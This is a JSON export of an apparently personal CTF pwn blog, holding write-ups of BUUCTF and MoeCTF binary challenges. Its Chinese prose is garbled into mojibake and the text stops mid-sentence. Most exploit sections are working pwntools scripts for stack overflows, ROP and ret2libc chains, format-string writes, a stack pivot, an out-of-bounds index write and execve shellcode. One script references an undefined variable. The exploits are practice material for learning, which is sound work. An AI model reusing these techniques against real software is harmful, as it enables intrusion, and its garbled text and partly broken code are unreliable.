[{"title":"buuå†é™©è®°","url":"/2026/02/17/buuoj/","content":"\nâ€œæ±‚å­¦ä¹‹è·¯è¿˜å¾ˆé•¿å‘¢â€\n\nåœ¨BUUCTFåšé¢˜çš„è®°å½•ï¼Œæœ¬ç« å°†ä¼šé•¿æœŸæ›´æ–°ã€‚ç¥æ—©æ—¥AK(æ ˆä»‹ç» - CTF Wiki)\npwn1_sctf_2016C++é™åˆ¶è¾“å…¥ï¼Œä½†æ˜¯èƒ½æŠŠIæ›¿æ¢æˆyoufrom pwn import *context.log_level = &#x27;debug&#x27;p = remote(&#x27;node5.buuoj.cn&#x27;,27535)# p = process(&#x27;./pwn1_sctf_2016&#x27;)bkd = 0x08048F0Debp = 0x12345678payload = b&#x27;I&#x27;*20+p32(ebp)+p32(bkd)p.sendline(payload)p.interactive()\nç¬¬äº”ç©ºé—´2015pwn5åœ¨mainå‡½æ•°ä¸­å³æœ‰system(â€œ/bin/shâ€)cmp     edx, eaxjz      short loc_804931Aæ¯”è¾ƒedxå’Œeaxçš„å€¼æ˜¯å¦ç›¸ç­‰ã€‚edxæ¥è‡ªè¾“å…¥çš„ç¬¬ä¸‰ä¸ªæ•°æ®eaxæ¥è‡ªdword_804C044å³ä»æ–‡ä»¶ä¸­è¯»å–çš„å€¼printf(buf);è¿™é‡Œæœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²ç”¨%xï¼Œå†™å€¼ç”¨%nã€‚%nä¼šæŠŠå·²è¾“å‡ºçš„å­—ç¬¦æ•°å†™å…¥åˆ°å¯¹åº”å‚æ•°æŒ‡å‘çš„åœ°å€ä¸­ã€‚\nciscn_2019_n_832ä½å°ç«¯åºï¼Œå…¨ä¿æŠ¤å¼€å¯ï¼Œå¯åŠ¨IDAï¼Œåªè¦var[13]=17å³å¯ï¼Œå‘é€4å­—èŠ‚æ•°æ®å¡«æ»¡from pwn import*p = process(&#x27;./ciscn_2019_n_8&#x27;)payload = b&#x27;aaaa&#x27;*13+p32(0x11)p.sendline(payload)p.interactive()\n\nç»™æ•°å­—ç±»å‹çš„å˜é‡èµ‹å€¼ï¼Œä¸èƒ½ç›´æ¥å‘é€å­—èŠ‚æµbâ€™xxxxâ€™ï¼Œåº”è¯¥å‘é€str(â€˜0x11â€™)ï¼Œä½†è¿™ç§æ— æ³•æ§åˆ¶ä½æ•°ï¼Œæ‰€ä»¥æœ€å¥½å‘é€p32(0x11)ã€‚bjdctf_2020_babystack64ä½ï¼ŒNXå¼€å¯LODWORD(nbytes) = 0;get_started_3dsctf_2016ç¨‹åºè¦æ­£å¸¸é€€å‡ºæ‰ä¼šç»™å›æ˜¾çœ‹åˆ°flag32ä½å°ç«¯åºï¼Œæ ˆæº¢å‡ºæ¼æ´å¡«æ»¡buf[56],æ³¨æ„getflagå‡½æ•°æœ‰å‚æ•°ï¼ŒåŠ ä¸Šï¼Œè¿˜æœ‰exitfrom pwn import*context.log_level = &#x27;debug&#x27;# p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,27225)get_flag = 0x080489a0exit_addr = 0x0804e6a0payload = b&#x27;a&#x27;*56 +p32(get_flag)+p32(exit_addr)+p32(0x308CD64F) + p32(0x195719D1)p.sendline(payload)p.recv()\nbabyropç¡®å®æ˜¯ç®€å•çš„ropmain()æä¾›äº†system(),åœ¨IDAä¸­shift+F12çœ‹åˆ°/bin/shï¼ŒROPgadget --binary ./babyrop | grep &quot;pop rdi&quot;å¾—åˆ°0x400683ï¼Œç°åœ¨ä»€ä¹ˆä¹Ÿä¸ç¼ºäº†ã€‚from pwn import*context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./babyrop&#x27;)#io = process(&#x27;./babyrop&#x27;)io = remote(&#x27;node5.buuoj.cn&#x27;,29393)call_system = 0x04005E3pop_rdi = 0x400683bin_sh_addr = 0x601048payload = b&#x27;a&#x27;*16payload += b&#x27;deadbeef&#x27;payload += p64(pop_rdi)payload += p64(bin_sh_addr)payload += p64(call_system)io.sendline(payload)io.interactive()\nlsåæ²¡æœ‰flagï¼Œæ‰€ä»¥ä½¿ç”¨find -name flagæ‰¾åˆ°flagcat /home/babyrop/flag\n\nbjdctf_2020_babystack2Arch:       amd64-64-littleRELRO:      Partial RELROStack:      No canary foundNX:         NX enabledPIE:        No PIE (0x400000)Stripped:   No\nCint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[12]; // [rsp+0h] [rbp-10h] BYREF  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF  setvbuf(_bss_start, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 1, 0LL);  LODWORD(nbytes) = 0;//æ­¤å¤„çœç•¥puts  __isoc99_scanf(&quot;%d&quot;, &amp;nbytes);  if ( (int)nbytes &gt; 10 )  &#123;    puts(&quot;Oops,u name is too long!&quot;);    exit(-1);  &#125;  puts(&quot;[+]What&#x27;s u name?&quot;);  read(0, buf, (unsigned int)nbytes);  return 0;&#125;ç®€å•çš„æ•´æ•°æº¢å‡ºï¼Œè´Ÿæ•°ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªå·¨å¤§çš„æ­£æ•°ï¼šfrom pwn import*context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&#x27;./pwn&#x27;)# p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,29753)# gdb.attach(p,&#x27;b main&#x27;)bkd = 0x400726p.recvuntil(b&#x27;name:\\n&#x27;)p.sendline(b&#x27;-1&#x27;)payload = b&#x27;a&#x27;*(12+4)+ b&#x27;SNOWCATT&#x27; + p64(bkd)p.sendline(payload)p.interactive()\njarvisoj_fmArch:       i386-32-littleRELRO:      Partial RELROStack:      Canary foundNX:         NX enabledPIE:        No PIE (0x8048000)Stripped:   No\nå¼€å¯äº†canaryï¼ŒGOTåªè¯»ï¼Œçœ‹èµ·æ¥æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[80]; // [esp+2Ch] [ebp-5Ch] BYREF  unsigned int v5; // [esp+7Ch] [ebp-Ch]  v5 = __readgsdword(0x14u);  be_nice_to_people();  memset(buf, 0, sizeof(buf));  read(0, buf, 0x50u);  printf(buf);  printf(&quot;%d!\\n&quot;, x);  if ( x == 4 )  &#123;    puts(&quot;running sh...&quot;);    system(&quot;/bin/sh&quot;);  &#125;  return 0;&#125;xæ˜¯.dataä¸Šçš„å…¨å±€å˜é‡ã€‚åœ¨printfå‡½æ•°ä¸­çš„å‚æ•°å¯æ§ äºæ˜¯å¯èƒ½å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦æ¼æ´ï¼Œåˆ©ç”¨å­—ç¬¦ä¸²æ¼æ´é‡å†™xçš„å€¼ã€‚è¾“å…¥çš„å­—ç¬¦ä¸²ä¼šå­˜å‚¨è¿›å…¥æ ˆå†…ï¼Œç„¶åprintfå‡½æ•°ä½¿ç”¨è¾“å…¥çš„å†…å®¹ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ§åˆ¶è¾“å‡ºã€‚è¾“å…¥å¤šä¸ª%pæ‰“å°æ ˆä¸Šçš„å†…å®¹åˆ¤æ–­è¾“å…¥çš„æ•°æ®åœ¨æ ˆä¸Šç¦»æ ˆé¡¶çš„åç§»ã€‚æˆ‘ä»¬æ¥æ‰¾ä¸€æ‰¾./fmaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%paaaa-0xff896a9c-0x50-0x1-(nil)-0x1-0xf7f04a20-0xff896bb4-(nil)-0xff896d2b-0x2c-0x61616161-0x2d70252d-0x252d7025æ³¨æ„åˆ°aaaaå³0x61616161å‡ºç°åœ¨ç¬¬11ä¸ªä½ç½®ä¸Šï¼Œåç§»é‡ä¸º11payloadå¦‚ä¸‹ï¼š%4c%13$n0x0804A02Cåˆ©ç”¨%nå°†è¾“å‡ºå­—ç¬¦æ•°å†™å…¥æŒ‡å®šåœ°å€ã€‚%4cå…ˆè¾“å‡º4ä¸ªå­—ç¬¦ï¼Œ%13$nå°†å‰é¢è¾“å‡ºçš„å­—ç¬¦æ•°ï¼ˆå³4ï¼‰å†™å…¥åœ°å€0x0804A02Cï¼Œå®ç°å¯¹ç›®æ ‡å†…å­˜çš„ä¿®æ”¹\nbjdctf_2020_babyropArch:       amd64-64-littleRELRO:      Partial RELROStack:      No canary foundNX:         NX enabledPIE:        No PIE (0x400000)Stripped:   No\nç®€å•çš„ropï¼ŒCan u return to libc ?ï¼Œæ˜¯ä¸€é“libcé¢˜ç›®ï¼Œç°åœ¨ä¸çŸ¥é“libcçš„ç‰ˆæœ¬ï¼Œäºæ˜¯ä½¿ç”¨LibcSearchçœ‹èµ·æ¥å¯ä»¥æ³„éœ²putsçš„åœ°å€ï¼Œä¸€ä¸ªæ€è·¯æ˜¯æŠŠputsçš„gotè¡¨åœ°å€ç”¨putsæ‰“å°å‡ºæ¥å¯»æ‰¾gadgetï¼šROPgadget --binary ./pwn --only &quot;pop|ret&quot;å¾—åˆ°0x0000000000400733 : pop rdi ; retäºæ˜¯è¿™æ ·æ„é€ payloadï¼špayload1 = b&#x27;a&#x27;*40 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)LibcSeearcherçš„ä½¿ç”¨ï¼šlibc = LibcSearcher(&quot;puts&quot;, leak_puts)ä½†æ˜¯ï¼Œè¿™æ—¶åŒ¹é…åˆ°äº†å¤šä¸ªç‰ˆæœ¬çš„libcï¼Œå¹¶ä¸å®¹æ˜“å°è¯•æˆåŠŸï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š[+] There are multiple libc that meet current constraints :0 - libc6_2.23-0ubuntu4_amd641 - libc6_2.23-0ubuntu7_amd642 - libc6_2.13-0ubuntu4_amd643 - libc6_2.13-0ubuntu15_amd644 - libc6_2.23-0ubuntu9_amd645 - libc6_2.23-0ubuntu10_amd646 - libc6_2.23-0ubuntu5_amd647 - libc6_2.23-0ubuntu11_amd648 - libc6_2.23-0ubuntu6_amd649 - libc-2.38.9000-12.fc40.i686[+] Choose one :äºæ˜¯ç¬”è€…åˆæ³„éœ²äº†readï¼Œå¢åŠ çº¦æŸã€‚è¿™æ ·åŒ¹é…çš„libcå°±åŸºæœ¬ç¬¦åˆäº†ã€‚from pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)# p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,28896)puts_plt = 0x4004e0puts_got = 0x601018read_got = 0x601020pop_rdi_ret = 0x400733vuln = 0x40067dpayload1 = b&#x27;a&#x27;*40 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)p.recvuntil(b&#x27;story!\\n&#x27;)p.sendline(payload1)leak_puts = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;))log.success(f&quot;leaked_puts: &#123;hex(leak_puts)&#125;&quot;)payload2 = b&#x27;a&#x27;*40 + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(vuln)p.recvuntil(b&#x27;story!\\n&#x27;)p.sendline(payload2)leak_read = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;))log.success(f&quot;leaked_puts: &#123;hex(leak_read)&#125;&quot;)libc = LibcSearcher(&quot;puts&quot;, leak_puts)libc.add_condition(&quot;read&quot;, leak_read)    # &lt;= å°±æ˜¯è¿™é‡Œï¼libc_base = leak_puts - libc.dump(&#x27;puts&#x27;)log.info(f&quot;libc_base: &#123;hex(libc_base)&#125;&quot;)system = libc_base + libc.dump(&#x27;system&#x27;)binsh = libc_base +  libc.dump(&#x27;str_bin_sh&#x27;)payload3 = b&#x27;a&#x27;*0x20 + b&#x27;SNOWACTT&#x27; + p64(pop_rdi_ret) + p64(binsh) + p64(system)p.recvuntil(b&#x27;story!\\n&#x27;)p.sendline(payload3)p.interactive()\njarvisoj_tell_me_somethingArch:       amd64-64-littleRELRO:      No RELROStack:      No canary foundNX:         NX enabledPIE:        No PIE (0x400000)Stripped:   No\nä¸»è¦çš„å‡½æ•°åœ¨è¿™é‡Œï¼šint __cdecl main(int argc, const char **argv, const char **envp)&#123;  __int64 v4; // [rsp+0h] [rbp-88h] BYREF  write(1, &quot;Input your message:\\n&quot;, 0x14uLL);  read(0, &amp;v4, 0x100uLL);  return write(1, &quot;I have received your message, Thank you!\\n&quot;, 0x29uLL);&#125;int good_game()&#123;  FILE *v0; // rbx  int result; // eax  char buf[9]; // [rsp+Fh] [rbp-9h] BYREF  v0 = fopen(&quot;flag.txt&quot;, &quot;r&quot;);  while ( 1 )  &#123;    result = fgetc(v0);    buf[0] = result;    if ( (_BYTE)result == 0xFF )      break;    write(1, buf, 1uLL);  &#125;  return result;&#125;ssize_t readmessage()&#123;  __int64 v1; // [rsp+0h] [rbp-88h] BYREF  return read(0, &amp;v1, 0x100uLL);&#125;æ³¨æ„åˆ°v4åœ¨rbp-88çš„ä½ç½®ï¼ŒæŸ¥çœ‹ä¸€ä¸‹å±€éƒ¨å˜é‡ç¡®å¦‚æ­¤ï¼Œæ ˆæº¢å‡ºï¼Œfrom pwn import *import timecontext.log_level = &#x27;debug&#x27;# p = process(&#x27;./guestbook&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,29823)p.recvline()flag_addr = 0x0400620payload = b&#x27;a&#x27;* 0x88 + p64(flag_addr)p.send(payload)sleep(1)p.recv()\nciscn_2019_es_2å±…ç„¶æ˜¯æ ˆè¿ç§»ï¼š\nArch:       i386-32-littleRELRO:      Partial RELROStack:      No canary foundNX:         NX enabledPIE:        No PIE (0x8048000)Stripped:   No\næœ‰åé—¨æ— &quot;/bin/sh&quot;ï¼Œçœ‹æ¥éœ€è¦è‡ªå·±è¯»è¿›å»ã€‚int vul()&#123;  char s[40]; // [esp+0h] [ebp-28h] BYREF  memset(s, 0, 0x20u);  read(0, s, 0x30u);  printf(&quot;Hello, %s\\n&quot;, s);  read(0, s, 0x30u);  return printf(&quot;Hello, %s\\n&quot;, s);&#125;çœ‹èµ·æ¥åˆ†é…äº†ä¸€å—å†…å­˜sï¼Œè¯»48å­—èŠ‚ï¼Œåªèƒ½è¦†ç›–ebpå’Œè¿”å›åœ°å€ã€‚å…ˆæŠŠropé“¾å†™é“æ ˆä¸Šï¼Œå†å°†æ ˆè¿ç§»åˆ°å†™çš„åœ°æ–¹å³å¯ã€‚è¦æƒ³åŠæ³•æ³„éœ²ebpåœ°å€ã€‚from pwn import *context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)p=process(&quot;pwn&quot;)#gdb.attach(io,&#x27;b *0x080485BE&#x27;)elf=ELF(&quot;./pwn&quot;)payload1=b&#x27;a&#x27;*0x24+b&#x27;b&#x27;*0x4p.recvuntil(b&quot;\\n&quot;)p.send(payload1)p.recvuntil(b&quot;bbbb&quot;)ebp_addr=u32(io.recv(4))log.info(f&quot;ebp_addr:&#123;hex(ebp_addr)&#125;&quot;)leave_ret=0x08048562sh_addr=ebp_addr-0x38payload2=b&#x27;a&#x27;*0x4+p32(elf.plt[&quot;system&quot;])+p32(0xdeadbeef)+p32(sh_addr+0x10)+b&#x27;/bin/sh&#x27;payload2=payload2.ljust(0x28,b&quot;\\x00&quot;)payload2+=p32(sh_addr)+p32(leave_ret)p.send(payload2)p.interactive()\nHarekazeCTF2019baby_ropArch:       amd64-64-littleRELRO:      Partial RELROStack:      No canary foundNX:         NX enabledPIE:        No PIE (0x400000)Stripped:   No\nå¥½ç¥ç§˜ã€‚int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[28]; // [rsp+0h] [rbp-20h] BYREF  int v5; // [rsp+1Ch] [rbp-4h]  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 2, 0LL);  printf(&quot;What&#x27;s your name? &quot;);  v5 = read(0, buf, 0x100uLL);  buf[v5 - 1] = 0;  printf(&quot;Welcome to the Pwn World again, %s!\\n&quot;, buf);  return 0;&#125;buf[v5 - 1] = 0;åŸæœ¬æ˜¯ä¸ºäº†å»æ‰è¾“å…¥å­—ç¬¦ä¸²æœ«å°¾çš„æ¢è¡Œç¬¦è¦æ³„éœ²libcï¼Œè¿™é‡Œæ²¡æœ‰puts()ï¼Œäºæ˜¯æƒ³åˆ°ä½¿ç”¨printf()ROPgadget --binary ./pwn --only &quot;pop|ret&quot;0x0000000000400733 : pop rdi ; ret0x0000000000400731 : pop rsi ; pop r15 ; retROPgadget --binary babyrop2 --string &quot;%s&quot;0x0000000000400790 : %såœ¨æ³„éœ²libcæ—¶é‡åˆ°çš„é—®é¢˜ï¼Œæ˜æ˜å·²ç»è°ƒç”¨è¿‡printf()ï¼Œä½†æ˜¯ä½¿ç”¨printfçš„gotè¡¨å´ä¸èƒ½æ³„éœ²å‡ºåœ°å€ï¼Œäºæ˜¯ä½¿ç”¨readã€‚æ„é€ printf(&quot;%s&quot;, read_got)from pwn import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)p = process(&#x27;./pwn&#x27;)# gdb.attach(p,&#x27;b * 0x400689&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,27867)pop_rdi     = 0x400733pop_rsi_r15 = 0x400731printf_plt  = elf.plt[&quot;printf&quot;]ret         = 0x4004d1fmt_s       = 0x400790read_got    = elf.got[&quot;read&quot;]main        = 0x400636payload = b&#x27;a&#x27;*40payload += p64(pop_rdi) + p64(fmt_s) + p64(pop_rsi_r15) + p64(read_got) + p64(0) + p64(printf_plt) + p64(main)p.sendafter(b&#x27;name? &#x27;,payload)p.recvuntil(b&#x27;!\\n&#x27;)leak_read = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))log.success(f&quot;&#123;hex(leak_read)&#125;&quot;)libc.address =  leak_read - libc.symbols[&#x27;read&#x27;]system = libc.symbols[&#x27;system&#x27;]bin_sh= next(libc.search(b&#x27;/bin/sh&#x27;))p.recvuntil(b&#x27;name? &#x27;)payload1 = b&#x27;a&#x27;*40 + p64(pop_rdi) + p64(bin_sh) + p64(system)p.sendline(payload1)p.interactive()\n","categories":["PWN","WP"],"tags":["Write Up"]},{"title":"è®°ä¸€é“PWNé¢˜(æ•´æ•°æº¢å‡º)","url":"/2026/02/19/hacker/","content":"\nçœ‹èµ·æ¥å¾ˆå®‰å…¨å‘¢ã€‚\n\nåšäº†å¾ˆå¤šæ ˆæº¢å‡ºçš„é¢˜ç›®ï¼Œè¿™é“ä¸å¤ªä¸€æ ·ã€‚è¿™æœ¬è´¨ä¸Šæ˜¯æ•°ç»„ä¸‹æ ‡è¶Šç•Œæ¼æ´ï¼Œç”±äºç¼ºå°‘å¯¹ç´¢å¼•ä¸‹é™çš„æ£€æŸ¥ï¼Œé…åˆæ•´æ•°æº¢å‡ºè¾¾æˆäº†ä»»æ„åœ°å€å†™ã€‚Arch:       amd64-64-littleRELRO:      Partial RELROStack:      Canary foundNX:         NX enabledPIE:        No PIE (0x3fc000)Stripped:   NoæŸ¥çœ‹IDAï¼šæœ‰åé—¨å‡½æ•°shellï¼Œä¸è¿‡æ²¡æœ‰\"bin/sh\"int shell(){  return system(\"id\");}main()åªæœ‰ä¸€äº›ä¿¡æ¯int __cdecl main(int argc, const char **argv, const char **envp){  char s[24]; // [rsp+0h] [rbp-20h] BYREF  unsigned __int64 v5; // [rsp+18h] [rbp-8h]  v5 = __readfsqword(0x28u);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(_bss_start, 0LL, 2, 0LL);  puts(\"Enter administrator's name:\");  __isoc99_scanf(\"%9s\", s);  puts(\"\\n--------------------\");  puts(\"Welcome:\");  puts(\"\\n\");  puts(s);  puts(\"\\n--------------------\");  hacker();  return 0;}è¿˜æœ‰æ¯”è¾ƒé‡è¦çš„hacker()unsigned __int64 hacker(){  int j; // [rsp+8h] [rbp-78h]  int i; // [rsp+Ch] [rbp-74h]  __int64 v3; // [rsp+10h] [rbp-70h] BYREF  __int64 v4; // [rsp+18h] [rbp-68h] BYREF  __int64 s[11]; // [rsp+20h] [rbp-60h] BYREF  unsigned __int64 v6; // [rsp+78h] [rbp-8h]  v6 = __readfsqword(0x28u);  puts(\"Welcome to hacker's system\\n\");  puts(\"Now you can set hackers' age\\n\");  memset(s, 0, 0x50uLL);  for ( i = 0; i &lt;= 9; ++i )  {    puts(\"Enter hacker index:\");    __isoc99_scanf(\"%lld\", &amp;v3);    puts(\"Enter hacker age:\");    __isoc99_scanf(\"%lld\", &amp;v4);    if ( v3 &gt; 9 )      exit(0);    s[v3] = v4;  }  puts(\"Now let's see your creation:'\");  for ( j = 0; j &lt;= 9; ++j )    printf(\"%lld \", s[j]);  return __readfsqword(0x28u) ^ v6;}\nä½†æ˜¯è¿™é‡Œå…¨éƒ¨ä½¿ç”¨çš„æ˜¯scanfè€Œä¸æ˜¯åƒreadå’Œgetsè¿™æ ·çš„å±é™©å‡½æ•°ã€‚å¾ˆéš¾è¿›è¡Œæ ˆæº¢å‡ºï¼Œè¿™æ—¶æ³¨æ„åˆ°s[11]è¯»å–çš„é€»è¾‘æ˜¯ç´¢å¼•+å†…å®¹ï¼Œç´¢å¼•v3 &gt; 9åˆ™é€€å‡ºï¼Œæœ€å¤šè¯»10æ¬¡ã€‚\n\nä»¥å‰åšè¿‡çš„ä¸€äº›pwné¢˜æ˜¯å¡«è¿›å»-1ã€‚è®¡ç®—æœºå­˜å‚¨æœ‰ç¬¦å·æ•´æ•°æ—¶ï¼Œä¸ä¼šç›´æ¥å­˜æ­£è´Ÿå·ï¼Œè€Œæ˜¯ç”¨è¡¥ç è¡¨ç¤ºï¼š\n\næ­£æ•°çš„è¡¥ç  = åŸç ï¼ˆç›´æ¥æ˜¯æ•°å­—çš„äºŒè¿›åˆ¶ï¼‰\nè´Ÿæ•°çš„è¡¥ç  = å¯¹åº”æ­£æ•°çš„åŸç ã€ŒæŒ‰ä½å–å + 1ã€æ¯”å¦‚:\n64ä½æ•´æ•°__int64ï¼Œ-1ä¼šä»¥0xFFFFFFFFFFFFFFFFå‚¨å­˜\n32ä½æ•´æ•°å³intï¼Œ-1ä»¥0xFFFFFFFF\n8ä½æ•´æ•°ï¼Œ-1ä»¥0xFFè¡¨ç¤º\n\næ•°ç»„sä½äºrbp - 0x60ï¼Œè€Œå‡½æ•°è¿”å›åœ°å€ä½äº rbp + 0x08ã€‚ä» s çš„èµ·å§‹ç‚¹åˆ°è¿”å›åœ°å€éœ€è¦è·³è¿‡å¤šå°‘ä¸ªå­—èŠ‚ï¼š0x08 - (-0x60) = 0x68ï¼Œä¹Ÿå°±æ˜¯104å­—èŠ‚ã€‚ç”±äºæ•°ç»„ s æ˜¯ __int64 ç±»å‹ï¼Œæ¯ä¸ªå…ƒç´ å  8 å­—èŠ‚ï¼Œæˆ‘ä»¬è¦æ‰¾çš„ç´¢å¼•  åº”è¯¥æ˜¯ï¼šä½†ä»£ç é‡Œæœ‰ if (v3 &gt; 9) exit(0);ï¼Œç›´æ¥è¾“å…¥ 13 ä¼šå¯¼è‡´ç¨‹åºè‡ªæ€ã€‚\nåœ¨ 64 ä½ç³»ç»Ÿä¸­ï¼Œå†…å­˜åœ°å€è®¡ç®—æ˜¯åŸºäº 64 ä½æ— ç¬¦å·æ•°çš„ã€‚å½“ä½ è®¿é—® s[v3] æ—¶ï¼Œåº•å±‚æ±‡ç¼–åšçš„äº‹æƒ…æ˜¯ï¼šç›®æ ‡åœ°å€æ•°ç»„é¦–åœ°å€æ¯”å¦‚ï¼šmov     rax, [rbp+var_70]mov     rdx, [rbp+var_68]mov     [rbp+rax*8+s], rdxadd     [rbp+var_74], 1\nå¦‚æœæˆ‘ä»¬å°†  è®¾ä¸ºä¸€ä¸ªæå¤§çš„è´Ÿæ•°ï¼Œå½“å®ƒä¹˜ä»¥  æ—¶ï¼Œç»“æœä¼šè¶…å‡º64ä½å¯„å­˜å™¨èƒ½è¡¨è¾¾çš„æœ€å¤§å€¼ï¼Œä»è€Œå›åˆ°å°çš„å€¼æŠŠ  è¿™ä¸ªâ€œåœ†åœˆâ€æƒ³æˆä¸€ä¸ªå·¨å¤§çš„æ•°ã€‚æˆ‘ä»¬è¦æ‰¾çš„  å®é™…ä¸Šæ˜¯ï¼š\nv3 = (104 - 2^{64}) / 8\n\n\né™¤ä»¥ 8ï¼šè¿™å°±æ˜¯é‚£ä¸ªé­”æ³•æ•°å­—ï¼š-2305843009213693939\n\n\né‚£ä¹ˆå…ˆæµ‹è¯•ä¸€ä¸‹ï¼Œshell = 0x4007e6def send_payload(idx, val):Â  Â  p.sendlineafter(b\"index:\", str(idx).encode())Â  Â  p.sendlineafter(b\"age:\", str(val).encode())magic = -2305843009213693939p.sendlineafter(b\"name:\", b\"snowcat\")send_payload(magic, shell)for _ in range(9):    p.sendlineafter(b\"index:\", b\"0\")    p.sendlineafter(b\"age:\", b\"0\")p.interactive()è¿™é‡Œå°†shellæ”¹æˆshell+1æˆåŠŸæ‰“å°äº†idä¿¡æ¯ï¼Œå› ä¸ºéœ€è¦è·³è¿‡push rbpè¯´æ˜å¯è¡Œã€‚ä¹‹åæ˜¯æƒ³æ€ä¹ˆæ‰§è¡Œâ€/bin/shâ€ï¼Œè¿™æ—¶æƒ³åˆ°main()ä¸­å¯ä»¥è¯»9ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯æ¯”è¾ƒéº»çƒ¦ï¼Œæƒ³åˆ°å·²ç»å¯ä»¥åœ¨è¿”å›åœ°å€ä¸­å†™ropäº†ï¼Œäºæ˜¯ret2libcã€‚ç¬”è€…ç›´æ¥è¿·ä½äº†ã€‚å®Œæ•´expå¦‚ä¸‹ï¼šfrom pwn import *context(arch='amd64', os='linux', log_level='debug')context.terminal = ['tmux','splitw','-h']p = process('./pwn')elf = ELF('./pwn')libc = ELF('libc.so.6') pop_rdi = 0x400a33ret = 0x400631hacker = 0x4007f7main = 0x4008fcstart = 0x4006f0magic = -2305843009213693939def send_payload(idx, val):    p.sendlineafter(b\"index:\", str(idx).encode())    p.sendlineafter(b\"age:\", str(val).encode())p.sendlineafter(b\"name:\", b\"snowcat\")send_payload(magic, pop_rdi)send_payload(magic + 1, elf.got['puts'])send_payload(magic + 2, elf.plt['puts'])send_payload(magic + 3, start)for i in range(6):     send_payload(0, 0)p.recvuntil(b\"0 0 0 0 0 0 0 0 0 0 \")leak_addr = u64(p.recv(6).ljust(8, b'\\x00'))log.success(f\"Leaked puts address: {hex(leak_addr)}\")libc.address = leak_addr - libc.symbols['puts']bin_sh_addr = next(libc.search(b'/bin/sh'))system_addr = libc.symbols['system']p.sendlineafter(b\"name:\", b\"snowcat\")send_payload(magic, pop_rdi) send_payload(magic + 1, bin_sh_addr)send_payload(magic + 2, ret)send_payload(magic + 3, system_addr)# gdb.attach(p, \"b 0x4008FA\")for i in range(6): send_payload(0, 0)p.interactive()\n","categories":["PWN"]},{"title":"Hello World!","url":"/2026/01/16/helloword/","content":"Iâ€™m Snowcat, a PWN novice. Welcome to my security notes. It all started with MISC; now thereâ€™s no turning back from PWN. Feedback and insights from masters are always welcome!\n"},{"title":"MoeCTF2025(PWN)éå®˜æ–¹ä¸ªäººé¢˜è§£","url":"/2026/01/26/moectf2025/","content":"#MoeCTF2025çš„PWNä¸ªäººå‘é¢˜è§£ï¼Œç¬”è€…æ ¹æ®éš¾æ˜“é€‚å½“è¿›è¡Œäº†æ’åºï¼Œæ¬¢è¿å¤§å®¶å‚è€ƒäº¤æµã€‚\nEZtextç®€å•çš„ret2textï¼Œè¦†ç›–bufã€rbpï¼Œæ ˆå¯¹é½ï¼Œåé—¨å‡½æ•°from pwn import *context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)# p = process(&#x27;./pwn&#x27;)p = remote(&quot;172.30.48.1&quot;,58296)treasure = 0x4011B6ret_addr = 0x40122Dpayload = b&#x27;A&#x27;*16 + p64(ret_addr) + p64(treasure)p.recvuntil(b&#x27;stack?&#x27;)p.sendline(str(50))p.sendline(payload)p.interactive()\nezshellcodeç®€å•çš„shellcodeä¸€ä¸ªæ±‡ç¼–ç è½¬æœºå™¨ç çš„ç½‘ç«™Online x86 and x64 Intel Instruction Assemblerfrom pwn import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])p = process(&#x27;./pwn&#x27;)p.sendline(b&#x27;4&#x27;)p.recvuntil(b&#x27;permissions you just set.&#x27;)shellcode = &#x27;&#x27;&#x27;mov rbx, 0x68732f6e69622fpush rbxpush rsppop rdixor esi, esixor edx, edxpush 0x3bpop raxsyscall&#x27;&#x27;&#x27;shellcode=asm(shellcode)# &quot;\\x48\\xBB\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x00\\x53\\x54\\x5F\\x31\\xF6\\x31\\xD2\\x6A\\x3B\\x58\\x0F\\x05&quot;p.send(shellcode)p.interactive()\nè®¤è¯†libcä¸€ä¸ªlibcæ¿å­è§ezlibc\nstr_check\nç›¸ä¿¡ä½ å·²ç»åœ¨æŒ‡åŒ—ä¸­äº†è§£åˆ°cé£æ 